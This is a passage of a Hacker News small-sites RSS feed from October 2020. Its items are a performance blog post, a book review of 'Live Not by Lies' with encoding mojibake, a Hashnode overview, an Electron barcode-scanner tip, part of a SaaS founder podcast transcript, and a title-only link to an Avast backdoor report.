October 29, 2020 | https://decoded.avast.io/janvojtesek/fakembam-backdoor-delivered-through-software-updates/ | <a href="https://web.archive.org/web/*/https://decoded.avast.io/janvojtesek/fakembam-backdoor-delivered-through-software-updates/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://decoded.avast.io/janvojtesek/fakembam-backdoor-delivered-through-software-updates/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928188</guid>
            <pubDate>Thu, 29 Oct 2020 07:53:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Going Deep]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928173">thread link</a>) | @brendt_gd
<br/>
October 29, 2020 | https://sebastiandedeyne.com/going-deep/ | <a href="https://web.archive.org/web/*/https://sebastiandedeyne.com/going-deep/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p><a href="https://sebastiandedeyne.com/going-deep/"><time datetime="2020-10-20">October 20, 2020</time>
| 1 min read</a></p></header><section><div><p>I recently stumbled across an over 5 year old <a href="https://news.ycombinator.com/item?id=8902739">comment</a> on Hacker News about performance.</p><blockquote><p>Lots of people make the mistake of thinking there‚Äôs only two vectors you can go to improve performance, high or wide.</p><ul><li>High - throw hardware at the problem, on a single machine</li><li>Wide - Add more machines</li></ul><p>There‚Äôs a third direction you can go, I call it ‚Äúgoing deep‚Äù. Today‚Äôs programs run on software stacks so high and so abstract that we‚Äôre just now getting around to redeveloping (again for like the 3rd or 4th time) software that performs about as well as software we had around in the 1990s and early 2000s</p><p>Going deep means stripping away this nonsense and getting down closer to the metal, using smart algorithms, planning and working through a problem and seeing if you can size the solution to running on one machine as-is.</p></blockquote><p>The author talks about ‚Äúhigh‚Äù and ‚Äúwide‚Äù hardware changes, but this can apply to software too. It‚Äôs easier to throw a cache at a slow piece of code than going deep and fixing it.</p><p>No need to look far, Electron is built on this principle. We‚Äôre adding heavy runtimes to support multiple platforms instead of staying close to the metal, and we pay the price in performance.</p><p>In general, it‚Äôs easier to add than subtract.</p><p>Which leads me to Derek Siver‚Äôs thoughts on <a href="https://sive.rs/subtract">subtraction</a>.</p><blockquote><p>Life can be improved by adding, or by subtracting. The world pushes us to add, because that benefits them. But the secret is to focus on subtracting.</p><p>The adding mindset is deeply ingrained. It‚Äôs easy to think I need something else. It‚Äôs hard to look instead at what to remove.</p></blockquote><p>Adding is often a short-term solution. This isn‚Äôt necessarily a bad thing: time and budget restrictions are real problems. Adding often accrues more debt than subtracting, that‚Äôs the price we pay. Adding doesn‚Äôt save time, it lends time.</p></div></section></article></div>]]>
            </description>
            <link>https://sebastiandedeyne.com/going-deep/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928173</guid>
            <pubDate>Thu, 29 Oct 2020 07:50:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Book Review: ‚ÄúLive Not by Lies‚Äù]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928165">thread link</a>) | @johntfella
<br/>
October 29, 2020 | https://conciliarpost.com/reviews/book-reviews/book-review-live-not-by-lies/ | <a href="https://web.archive.org/web/*/https://conciliarpost.com/reviews/book-reviews/book-review-live-not-by-lies/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>A lot can change in three years.√Ç&nbsp;</span></p><p><span>In March of 2017, I found myself sitting in my New Haven apartment, with just a few months to go before graduating from law school, penning a </span><a href="https://www.google.com/search?client=safari&amp;rls=en&amp;q=ehrett+benedict+option&amp;ie=UTF-8&amp;oe=UTF-8"><span>review</span></a><span> of Rod Dreher√¢‚Ç¨‚Ñ¢s buzzy new book, </span><a href="https://www.amazon.com/Benedict-Option-Strategy-Christians-Post-Christian/dp/0735213291"><i><span>The Benedict Option</span></i><span>.</span></a><span> While I appreciated its diagnosis of modern thought and clarion call to action, I√¢‚Ç¨‚Ñ¢ll admit that I didn√¢‚Ç¨‚Ñ¢t buy into its full vision. Following the unexpected results of the 2016 election and the prospect of a federal government under unified Republican control, I thought the book√¢‚Ç¨‚Ñ¢s dire depictions of creeping post-Christian orthodoxies were premature√¢‚Ç¨‚Äùand I had no interest whatsoever in (what I understood to be) a call to public disengagement. At the end of the day, I was relatively sanguine about the future of √¢‚Ç¨≈ìliberal√¢‚Ç¨ÔøΩ discourse (in the best sense) in the academic world, coupled with an influential Christian witness in the public sphere. I was, in short, fully √¢‚Ç¨≈ì</span><a href="https://www.patheos.com/blogs/betweentwokingdoms/2019/06/the-death-of-liberal-democracy-a-few-notes-on-the-ahmari-french-controversy/"><span>Team French</span></a><span>.√¢‚Ç¨ÔøΩ√Ç&nbsp;</span></p><p><span>The world looks different now, though. Since graduating, I√¢‚Ç¨‚Ñ¢ve spent my professional career at ground zero of current debates over religious liberty and the place of people of faith in public life√¢‚Ç¨‚Äùfrom serving in the federal judicial system in California and Texas, to writing numerous </span><a href="https://www.supremecourt.gov/DocketPDF/19/19-431/121116/20191101154131639_Little%20Sisters%20Amicus%20Brief%20TO%20FILE.pdf"><span>amicus</span></a> <a href="https://www.supremecourt.gov/DocketPDF/19/19-431/137551/20200309164825846_Little%20Sisters%20Merits%20Amicus%20Brief%20TO%20FILE.pdf"><span>briefs</span></a><span> at a large D.C. law firm, and finally to working on these issues on Capitol Hill. Institutionally, I have every incentive in the world to believe that American cultural pathologies can be addressed through better policy, or at least that some sort of uneasy political equilibrium can be brokered.√Ç&nbsp;</span></p><p><span>But despite my best efforts, I√¢‚Ç¨‚Ñ¢ve come to see that Dreher was right: there needs to be a √¢‚Ç¨≈ìPlan B√¢‚Ç¨ÔøΩ for the future of American Christianity. What Matthew Arnold </span><a href="https://www.poetryfoundation.org/poems/43588/dover-beach"><span>called</span></a><span> the √¢‚Ç¨≈ìmelancholy, long, withdrawing roar√¢‚Ç¨ÔøΩ of the sea of faith continues to echo across the American landscape, and the shapes of thoroughly post-Christian ideologies are now coming into view. Revival has indeed come to America, as so many Christians prayed√¢‚Ç¨‚Äùbut not a Christian revival.</span><span>√Ç&nbsp;</span></p><p><span>Dreher√¢‚Ç¨‚Ñ¢s latest book, </span><a href="https://www.amazon.com/Live-Not-Lies-Christian-Dissidents/dp/0593087399"><i><span>Live Not By Lies: A Manual for Christian Dissidents</span></i></a><span>, is something of a manifesto for this moment. At once both darker and more hopeful than its predecessor, it is ruthlessly clear-eyed about the precise threats it identifies, and yet equally clear-eyed about the ways in which ordinary Christians ought to respond to them. Perhaps most significantly, the book feels uncommonly personal, thanks to its heavy reliance on the stories of Eastern European Christians who lived through the Soviet Union√¢‚Ç¨‚Ñ¢s totalitarianism√¢‚Ç¨‚Äùan analogy to the status quo that, as Dreher repeatedly points out, is admittedly imperfect, but that nevertheless provides a foundation for important reflections.</span></p><p><span>Much of </span><i><span>The Benedict Option</span></i><span> outlined an extended genealogy of the Western predicament (in the style of Brad Gregory√¢‚Ç¨‚Ñ¢s </span><a href="https://www.amazon.com/Unintended-Reformation-Religious-Revolution-Secularized/dp/0674088050"><i><span>The Unintended Reformation</span></i></a><span>, Richard Weaver√¢‚Ç¨‚Ñ¢s </span><a href="https://www.amazon.com/Richard-M-Weaver/dp/022609006X/ref=sr_1_1?crid=1YWMGX6DZ0I5U&amp;dchild=1&amp;keywords=idea+have+consequences&amp;qid=1596043224&amp;s=books&amp;sprefix=ideas+have+%2Cstripbooks%2C268&amp;sr=1-1"><i><span>Ideas Have Consequences</span></i></a><span>, and Patrick Deneen√¢‚Ç¨‚Ñ¢s </span><a href="https://www.amazon.com/Why-Liberalism-Failed-Politics-Culture/dp/0300240023/ref=sr_1_1_sspa?crid=3994184DHHDAN&amp;dchild=1&amp;keywords=why+liberalism+failed&amp;qid=1596043235&amp;s=books&amp;sprefix=why+li%2Cstripbooks%2C270&amp;sr=1-1-spons&amp;psc=1&amp;spLa=ZW5jcnlwdGVkUXVhbGlmaWVyPUEyQUhQMThJWEU4U0o5JmVuY3J5cHRlZElkPUEwMDAzNzE1MVJaMlJCQ01LU09HQyZlbmNyeXB0ZWRBZElkPUEwNTY1NDA3MTg4M1E5MkI5STQ4USZ3aWRnZXROYW1lPXNwX2F0ZiZhY3Rpb249Y2xpY2tSZWRpcmVjdCZkb05vdExvZ0NsaWNrPXRydWU="><i><span>Why Liberalism Failed</span></i></a><span>), but </span><i><span>Live Not By Lies </span></i><span>takes a different tack. This time around, Dreher sees danger ahead as a result of the confluence of three specific intersecting elements: cultural decadence and stagnation, a neo-religious progressive ideology, and the rise of √¢‚Ç¨≈ìsurveillance capitalism.√¢‚Ç¨ÔøΩ</span></p><p><b>The Age of Decay</b></p><p><span>The American public, Dreher argues, is ripe for unrest. As a long line of social scientists√¢‚Ç¨‚Äùfrom </span><a href="https://www.amazon.com/Bowling-Alone-Collapse-American-Community/dp/0743203046"><span>Robert Putnam</span></a><span> to </span><a href="https://www.amazon.com/Coming-Apart-State-America-1960-2010/dp/030745343X/ref=pd_lpo_14_t_2/131-4027336-5851305?_encoding=UTF8&amp;pd_rd_i=030745343X&amp;pd_rd_r=e9c8da75-0443-4cda-b566-2704261e1249&amp;pd_rd_w=vwR1j&amp;pd_rd_wg=FicQv&amp;pf_rd_p=7b36d496-f366-4631-94d3-61b87b52511b&amp;pf_rd_r=NH2ATV9JB56AGKC40PHQ&amp;psc=1&amp;refRID=NH2ATV9JB56AGKC40PHQ"><span>Charles Murray</span></a><span>√¢‚Ç¨‚Äùhas argued for years, American civil society has grown thin and deracinated. Rates of church attendance and community participation are down, fewer and fewer Americans have close real-life friends or host in-person gatherings, and an ever-increasing number of human interactions are channeled through a handful of powerful online platforms. (The ongoing COVID-19 pandemic, of course, has only accelerated these trends.)√Ç&nbsp;</span></p><p><span>Worse, faith in institutions√¢‚Ç¨‚Äùwith the exception of the military√¢‚Ç¨‚Äùhas cratered. There is widespread cynicism, particularly among younger Americans, about the self-dealing of governmental branches, corporations, religious organizations, and countless other entities. It is increasingly difficult to see how a flourishing society can be built on foundations that are rotten√¢‚Ç¨‚Äùor at least believed to be rotten by a large majority. Unless one accepts Ross Douthat√¢‚Ç¨‚Ñ¢s recent </span><a href="https://www.patheos.com/blogs/betweentwokingdoms/2020/03/the-decadent-society-misses-the-mark/"><span>argument</span></a><span> that the current state of √¢‚Ç¨≈ìdecadence√¢‚Ç¨ÔøΩ can go on indefinitely, it certainly seems like something has to change.</span></p><p><b>The Great Awokening</b></p><p><span>√Ç&nbsp;</span><span>Nature, of course, abhors a vacuum√¢‚Ç¨‚Äùand under conditions of socioeconomic stagnation and widespread disillusionment, it√¢‚Ç¨‚Ñ¢s only natural that nontraditional manifestations of human beings√¢‚Ç¨‚Ñ¢ innate religious impulses have emerged.</span></p><p><span>To that end, Dreher discusses at length the emergence, within the last 5-6 years, of what a number of writers have called the √¢‚Ç¨≈ìsocial justice movement√¢‚Ç¨ÔøΩ (Dreher tends to use the pejorative √¢‚Ç¨≈ìsocial justice warrior,√¢‚Ç¨ÔøΩ or √¢‚Ç¨≈ìSJW√¢‚Ç¨ÔøΩ) and what Wesley Yang </span><a href="https://twitter.com/wesyang/status/1130852792929677312"><span>describes</span></a><span> as the √¢‚Ç¨≈ìsuccessor ideology√¢‚Ç¨ÔøΩ√¢‚Ç¨‚Äùthe successor, that is, to liberal democracy. Philosophically, Dreher argues, this movement is loosely structured around five central tenets: (1) the central fact of human existence is power and how it is used; (2) there is no such thing as objective truth; there is only power; (3) identity politics sorts oppressed from oppressor; (4) intersectionality is social justice ecumenism; (5) language creates human realities.</span><span>√Ç&nbsp;</span></p><p><span>This movement largely rejects what is seen as the √¢‚Ç¨≈ìclass reductionism√¢‚Ç¨ÔøΩ of orthodox Marxism (that is, its failure to emphasize other axes of oppression, such as race and gender), but nevertheless shares classical Marxism√¢‚Ç¨‚Ñ¢s commitment to a broad narrative of inevitable historical progress. Just as traditional Marxism represented itself as an √¢‚Ç¨≈ìobjective√¢‚Ç¨ÔøΩ science, the successor ideology frames itself as supra-ideological by generating reams of peer-reviewed material within academic disciplines that are </span><i><span>a priori</span></i><span> committed to its governing premises. And so, on this view, right-thinking and science-minded people have an absolute duty to help society move from a benighted history of oppression into a more just and equitable future, even if that future can only be vaguely conceived. (No slogan better exemplifies this than the ubiquitous demand that one stand on the √¢‚Ç¨≈ìright side of history.√¢‚Ç¨ÔøΩ) For the committed activist, </span><i><span>everyone</span></i><span>√¢‚Ç¨‚Äùnot merely isolated idealists√¢‚Ç¨‚Äùneeds to be a part of that process.√Ç&nbsp;</span><span>√Ç&nbsp;</span></p><p><b>The Invisible Hand</b></p><p><span>As Dreher explains, the last few years have witnessed a rapid and (for those of a conservative temperament) alarming transformation of American capitalism. While for decades, companies adopted a fairly apolitical attitude toward public life√¢‚Ç¨‚Äùas Michael Jordan put it, √¢‚Ç¨≈ìRepublicans buy sneakers too√¢‚Ç¨ÔøΩ√¢‚Ç¨‚Äùrecent years have taught that there√¢‚Ç¨‚Ñ¢s good money to be made in adopting aggressive stances on political and cultural issues.</span></p><p><span>Nowhere, Dreher notes, has this tendency been more pronounced than in the world of √¢‚Ç¨≈ìbig tech.√¢‚Ç¨ÔøΩ Not only are the largest tech companies accumulating unheard-of amounts of data on their users (a point Dreher draws from Shoshana Zuboff√¢‚Ç¨‚Ñ¢s </span><a href="https://www.amazon.com/Age-Surveillance-Capitalism-Future-Frontier/dp/1541758005/ref=sr_1_1?crid=2XPALZ08A8IAB&amp;dchild=1&amp;keywords=the+age+of+surveillance+capitalism&amp;qid=1596043284&amp;s=books&amp;sprefix=the+age+of+sur%2Cstripbooks%2C179&amp;sr=1-1"><span>work</span></a><span>), but virtually every day brings another example of technology giants deploying their platform rules unevenly or in a discriminatory manner. Conservative opinion websites (well above Breitbart quality level) </span><a href="https://nypost.com/2020/07/22/ex-google-worker-says-bug-may-have-exposed-conservative-blacklist/"><span>mysteriously disappear</span></a><span> from Google search results. Amazon gives the Southern Poverty Law Center√¢‚Ç¨‚Äùwhich </span><a href="https://www.dailysignal.com/2020/05/21/conservatives-ask-amazon-to-end-splcs-role-as-hate-group-sheriff/"><span>labels</span></a><span> Christian organizations like the Family Research Council and Alliance Defending Freedom as √¢‚Ç¨≈ìhate groups√¢‚Ç¨ÔøΩ due to their stance on LGBT rights issues√¢‚Ç¨‚Äùveto power over eligibility for its AmazonSmile charitable giving program. Twitter </span><a href="https://www.hollywoodreporter.com/news/unplanned-movie-twitter-account-briefly-suspended-1198343"><span>censors</span></a><span> pro-life accounts while </span><a href="https://www.timesofisrael.com/as-twitter-checks-trump-khamenei-account-left-alone-despite-pleas-from-israel/"><span>permitting</span></a><span> Iran√¢‚Ç¨‚Ñ¢s Ayatollah Khameini to threaten the total destruction of Israel. On and on it goes, with no real end in sight.</span></p><p><span>In part, it seems to me, this patchwork pattern of enforcement is likely a product of the ungrounded approach to regulating free speech many tech platforms have adopted. The prevailing approach, it appears, is inclined to credit almost any claim asserted by enough people under the banner of √¢‚Ç¨≈ìhuman rights√¢‚Ç¨ÔøΩ√¢‚Ç¨‚Äùan approach which tends to rule out any questioning or invalidation of a group-based identity one happens to claim. Conservatives, many of whom would hold that not all identity-based claims reflect legitimate human rights issues, are generally loath to expand the category of what counts as √¢‚Ç¨≈ìhuman rights.√¢‚Ç¨ÔøΩ But arguments to that effect are easily framed as impediments to √¢‚Ç¨≈ìprogress√¢‚Ç¨ÔøΩ and expressions of √¢‚Ç¨≈ìhate√¢‚Ç¨ÔøΩ: who wants to stand in the way of √¢‚Ç¨≈ìhuman rights√¢‚Ç¨ÔøΩ or be on the √¢‚Ç¨≈ìwrong side of history√¢‚Ç¨ÔøΩ after all? And so, deprived of any real metaphysical underpinnings, the discourse ends up </span><a href="https://www.patheos.com/blogs/betweentwokingdoms/2019/11/is-human-rights-too-inflated-an-ideal/"><span>rigged</span></a><span> in favor of ever-more-expansive rights-claims, and ever-narrower boundaries of permitted expression.</span></p><p><span>Violation of those boundaries, of course, comes at a heavy price. It√¢‚Ç¨‚Ñ¢s no wonder that, following a </span><a href="https://www.theatlantic.com/ideas/archive/2020/06/stop-firing-innocent/613615/"><span>handful</span></a><span> of high-profile denunciations of ordinary people, √¢‚Ç¨≈ìcancel culture√¢‚Ç¨ÔøΩ is in the </span><a href="https://harpers.org/a-letter-on-justice-and-open-debate/"><span>news</span></a><span> right now, Those not inclined to see the current Twitter-mob culture as a problem tend to treat these cases as isolated instances that do not reflect a greater trend. Perhaps. But it is not at all difficult to conceive of what a truly </span><i><span>totalizing</span></i><span> √¢‚Ç¨≈ìcancel culture√¢‚Ç¨ÔøΩ might look like, or how close we are to that reality.</span></p><p><span>Imagine a world in which you are simultaneously fired from your job, cut off by banks and credit-card companies no longer wishing to transact with you, and denied access to any prominent technology platforms like Apple, Google, Facebook, Twitter, Uber, DoorDash√¢‚Ç¨‚Äùwith the reasons for your √¢‚Ç¨≈ìcancellation√¢‚Ç¨ÔøΩ preserved in perpetuity. (Do you really think any of these companies would hold the line in the face of a social media activist avalanche?) Worse, the power of surveillance capitalism obliterates the possibility of simply moving to a new town, finding a new job, and reinventing oneself. You are abandoned into permanent nonperson status (unless ‚Ä¶</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://conciliarpost.com/reviews/book-reviews/book-review-live-not-by-lies/">https://conciliarpost.com/reviews/book-reviews/book-review-live-not-by-lies/</a></em></p>]]>
            </description>
            <link>https://conciliarpost.com/reviews/book-reviews/book-review-live-not-by-lies/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928165</guid>
            <pubDate>Thu, 29 Oct 2020 07:48:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Started with Hashnode]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928120">thread link</a>) | @kmhmubin
<br/>
October 29, 2020 | https://mubinsodyssey.com/getting-started-with-hashnode | <a href="https://web.archive.org/web/*/https://mubinsodyssey.com/getting-started-with-hashnode">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1603956252941/I7k2XbtM3.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p><a target="_blank" href="https://hashnode.com/@kmhmubin/joinme">Hashnode</a> is a free blogging platform with an amazing community that allows you to publish articles on your own domain. On October 27, 2020, Hashnode achieves <strong>Product of the day</strong> on <a target="_blank" href="https://www.producthunt.com/posts/hashnode-platform">Producthunt</a>.</p>
<p>Hashnode gaining popularity because of its unique features and easy to use. It has lots of built-in features that every technical blogger needs. Let's find out what makes hashnode different.</p>
<h2 id="free">Free</h2>
<p>Traditional blog websites require a custom domain and hosting. And it's not cheap. Setting up those and make it fully functional requires a lot of time and technical knowledge. As a beginner, you might not own a custom domain or any of those skills which require setup. To solve this problem, Hashnode offers you a unique subdomain, which allows you to publish your content totally free.</p>
<h2 id="custom-domain">Custom Domain</h2>
<p>Haahnode offers you to add your custom domain to your existing blog. You can set up a custom domain with a CNAME record. </p>
<h2 id="customization">Customization</h2>
<p>You can personalize and customize your blog as you need. You can make your blog look different by adding custom CSS. Not only custom CSS, but you can also add third-party widgets.</p>

<p>Hashnode has an amazing community. You can meet new people every day. You can get help from others or sharing your thought with others. Hashnode also offers you an exclusive <a target="_blank" href="https://discord.gg/9KVywS">Discord Channel</a>, where you can directly talk with the founding members of Hashnode.</p>
<h2 id="learn-from-others">Learn from others</h2>
<p>On Hashnode, you can follow other developers. You can read their content and follow them so that your favorite writer publishes a post you get notified immodestly. </p>
<h2 id="draft-sharing">Draft Sharing</h2>
<p>I personally like this feature. If you are new to writing, you always feel that is it enough or lack something or fully explain what I wanted to. To answer all of those content, you can share your draft with others. They can read your draft and give you a lot of feedback.</p>
<h2 id="other-features">Other features</h2>
<p>Some of the other features are</p>
<ul>
<li>Get automated backups of your articles on your private GitHub repo</li>
<li>Use GitHub as a source for your articles</li>
<li>Automatic HTTPS</li>
<li>Fast CDN</li>
<li>Built-in newsletter service</li>
</ul>
<p>The good thing is that you can always request new features, which are implemented depending on usefulness. </p>
<h2 id="conclusion">Conclusion</h2>
<p>If you want to start publishing your own articles without worries and want an amazing community, Hashnode is for you.</p>
<p>In the next lesson, we‚Äôll learn how to set up Hashnode for you.</p>
<hr>
<p>üö©üëâ If it was useful to you, please Like/Share to reach others as well. Please hit the <strong><em>Subscribe</em></strong> button at the top of the page to get an email notification on my latest posts.</p>
<p>You can @ me on <strong>Twitter</strong> (<a target="_blank" href="https://twitter.com/kmhmubin">kmhmubin</a>) with comments, or feel free to follow.</p>
<p>The cover image is an improvisation on top of the work from <a target="_blank" href="https://www.freepik.com/vectors/people">freepik</a>.</p>
</div></div></section></div>]]>
            </description>
            <link>https://mubinsodyssey.com/getting-started-with-hashnode</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928120</guid>
            <pubDate>Thu, 29 Oct 2020 07:34:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Connect a Barcode Scanner to an Electron Desktop App]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24928099">thread link</a>) | @kornatzky
<br/>
October 29, 2020 | https://yoramkornatzky.com/post/connect-a-barcode-scanner-to-an-electron-desktop-app | <a href="https://web.archive.org/web/*/https://yoramkornatzky.com/post/connect-a-barcode-scanner-to-an-electron-desktop-app">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div data-type-cleanup="true">
<p><a href="https://www.electronjs.org/">Electron</a> is a cross-platform framework for building desktop apps with JavaScript, HTML, and CSS. </p>
<p>In agricultural, industrial, and logistics integrated facilities, such desktop apps often need to read information from barcodes and QR codes printed on real-life physical objects. </p>
<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/ce07e1db-ca22-6788-0271-799da9a1db81/6c2930d7-e6bf-3f81-e9a3-c442058c2d6d.png"></p>
<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/ce07e1db-ca22-6788-0271-799da9a1db81/82db0290-1e17-6945-cfda-5209bf26c0a6.png"></p>
<p>Such barcodes and QR codes are scanned with a barcode scanner such as <a href="http://www.zebra.com/DS4308">Zebra DS4305 Digital Scanner</a> connected to the computer with a USB connector.</p>
<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/ce07e1db-ca22-6788-0271-799da9a1db81/bc21ecf7-8096-0a7f-3769-7f7f85f0a99e.png"></p>
<p>Receiving the code into the Electron app turns up to be very simple. The scanner is viewed as a keyboard. </p>
<p>So if you have in the HTML an <code>input</code> element,</p>
<pre><code>&lt;input id="codeInput"/&gt;
</code></pre>
<p>And we focus the program on the input field, using JavaScript,</p>
<pre><code>document.getElementById("codeInput").focus();
</code></pre>
<p>The scanner reads the code into the input field like it was typed in by the keyboard.</p>

</div>
</div></div>]]>
            </description>
            <link>https://yoramkornatzky.com/post/connect-a-barcode-scanner-to-an-electron-desktop-app</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928099</guid>
            <pubDate>Thu, 29 Oct 2020 07:27:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bootstrapped to ‚Ç¨14m in ARR with Emeric Ernoult of Agorapulse]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928083">thread link</a>) | @Mike-Dane
<br/>
October 29, 2020 | https://keevi.io/from-bootstrapped-to-14m-in-10-years-with-emeric-ernoult-of-agorapulse | <a href="https://web.archive.org/web/*/https://keevi.io/from-bootstrapped-to-14m-in-10-years-with-emeric-ernoult-of-agorapulse">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-id="4dcbfdb" data-element_type="section">
						<div>
							<div>
					<div data-id="dbc9a3e" data-element_type="column">
			<div>
							<div>
						<div data-id="9040520" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><a href="https://www.linkedin.com/in/ernoult/?originalSubdomain=fr"><span>Emeric Ernoult</span></a><span>, Co-Founder at Agorapulse joins </span><a href="https://www.linkedin.com/in/hammadakbar/"><span>Hammad Akbar</span></a><span> in this episode of Launch Legends Podcast.</span></p><h2>Key Stats on Agorapulse</h2><ul><li><a href="https://www.agorapulse.com/"><span>Agorapulse</span></a><span> ARR was </span><span>‚Ç¨</span><span>140,000 in 2011.</span></li><li><span>In 2013-2014, Agorapulse was adding </span><span>‚Ç¨1000 MRR per month.</span></li><li><span>Broke even in 2015 and reached </span><span>‚Ç¨</span><span>100,000 MRR.</span></li><li><span>Now, it‚Äôs adding around </span><span>‚Ç¨</span><span>45,000 MRR per month.</span></li><li><span>‚Ç¨14m in ARR in 2020.&nbsp;</span></li><li><span>Got 7000 customers.</span></li></ul><h2>Key Takeaways</h2><ul><li><span>Making a product does not matter, what matters is how you market your product.</span></li><li><span>Pivot to new ideas when the existing idea is not producing any result.</span></li><li><span>Realize that when you are bootstrapped, your product is always limited</span></li><li><span>Develop a saas software that a person in the company is using on a daily basis.</span></li><li><span>You move slowly when you are bootstrapped and have limited resources.</span></li><li><span>When you are bootstrapped, your growth is slow and you lose a lot of business to big players who have raised funding.</span></li><li><span>Customer churn rate helps you determine whether a business is sustainable or not.</span></li><li><span>Content and SEO are the major source of traction.</span></li><li><span>Attend conferences to build relationships which can be beneficial during a product launch.</span></li><li><span>Work hard in the initial years to reach out to a place where you want to be.</span></li><li><span>Building a good product is not enough, there should be a way for letting the world know about it.</span></li><li><span>The effort you put initially might not be enough at the later stage of the business.</span></li><li><span>Look at the growth and progress of the last six months to determine if you should continue with the idea or not.</span></li><li><span>If you don‚Äôt see the needle moving in the right direction then stop following the same strategy.</span></li><li><span>If you have been stagnated, another six months would produce the same result.</span></li><li><span>If there is a little bit of improvement, then keep going.</span></li><li><span>Don‚Äôt expect progress to be massive.</span></li><li><span>Think long term</span></li><li><span>What you will do today will determine where you reach in the future.</span></li><li><span>Paid marketing is not a solution when it comes to product launch.</span></li><li><span>Word of mouth gives better results when you are launching a new product.</span></li><li><span>You should be clear enough what is needed to get the results at a later stage.</span></li><li><span>Always reinvent yourself.</span></li><li><span>One has to be ambitious to grow.</span></li><li><span>You need to be different from others.&nbsp;</span></li></ul><h2>Transcription</h2><p><b>Hammad:</b></p><p><span>Thank you very much for being on the show. So </span><a href="https://www.agorapulse.com/"><span>Agorapulse</span></a><span>, I know you told me you‚Äôve got around $14 million in revenue, subject to exchange rate, because I know you calculate everything in euros, and you‚Äôve got 7,000 customers and most of the customers are coming through your inbound efforts. So before we get there let‚Äôs talk about who you are and what you were doing before </span><a href="https://www.agorapulse.com/"><span>Agorapulse</span></a><span> and why did you start the company?</span></p><p><b>Emeric:</b></p><p><span>Thanks for having me. I‚Äôm </span><a href="https://www.linkedin.com/in/ernoult/?originalSubdomain=fr"><span>Emeric</span></a><span>, I‚Äôm a French citizen born in New York. So I also have the US passport which makes me a funny beast because I‚Äôm both American and French, which is a weird mix. I started my career as a business lawyer in 1995. So that‚Äôs my background. It didn‚Äôt last for long because I did that for five years and started my first company in 2000 with my co-founder Ben, who is still my co-founder today. So basically Ben and I started this company, the company behind </span><a href="https://www.agorapulse.com/"><span>Agorapulse</span></a><span> in July of 2000, 20 years ago. And, we‚Äôve tried to be successful many many times, pivoting many different times as well, and eventually started the Agorapulse in November of 2011.</span></p><p><b>Hammad:</b></p><p><span>So Emeric, I am cutting you there. When you say that you are pivoting, what was the company you started in 2000. And what did you pivot to?&nbsp;</span></p><p><b>Emeric:</b></p><p><span>It was a b2b SaaS already. It was called communities at the time. It did sound a lot like Facebook, but it was in 2000, it was in France, it was in French. So it was not a success. A lot of my friends keep telling me you invented Facebook for Facebook and I keep replying to them, the hundreds of people have invented Facebook before Facebook like Friendster, six degrees and </span><a href="https://myspace.com/"><span>Myspace</span></a><span>.</span></p><p><span>So a lot of people had this idea that social networking should be a thing before it was a thing and I always wanted them, but it didn‚Äôt work. And I was too early, we had debates with my co-founder at the time about the word social network, he didn‚Äôt like it. We launched that at a time when social networking was not a thing and people didn‚Äôt agree on what it meant so that it tells you something.&nbsp;</span></p><p><span>We did that until 2009, approximately. And, what we did in the meantime is we created a b2b Saas that was white labeled for brands. And that‚Äôs what we‚Äôve lived with in terms of making revenue and money between 2001 to 2012. So basically we were customizing the affinities. That was the named solution, putting CSS, HTML, CSS, and different codes and SSO and that kind of stuff.</span></p><p><span>So a brand could create its own community of passionate people about anything or bloggers or stuff like that. An American company did the same thing. It was creating your own social network. That‚Äôs what we were doing. But we started that year before them.</span></p><p><span>And, I like to say that, Marc Andreessen was behind inc. And I like to say that I was as smart as Marc Andreessen as we both failed at creating a b2b Saas software that allows all people to create their own social networks and yeah in 2011, we were trying to sell this, build your own social network to brands.</span></p><p><span>And every brand I was talking to were like, nah, nah we go on Facebook and do something there. It was like an introductory 10 meetings like that. I told my co-founder that‚Äôs it, you know, we can‚Äôt fight Facebook. This thing is going to take over the world.</span></p><p><span>We heard do something on Facebook or we give up. I‚Äôm fed up of making little money. Just to give you perspective in 2011, our ARR was </span><span>‚Ç¨</span><span>140,000. That‚Äôs what I make in three days or four days right now. So that was my ARR back then. So it gives you an idea of, you know, how far we have come.</span></p><p><b>Hammad:</b></p><p><span>How much were you taking home at that 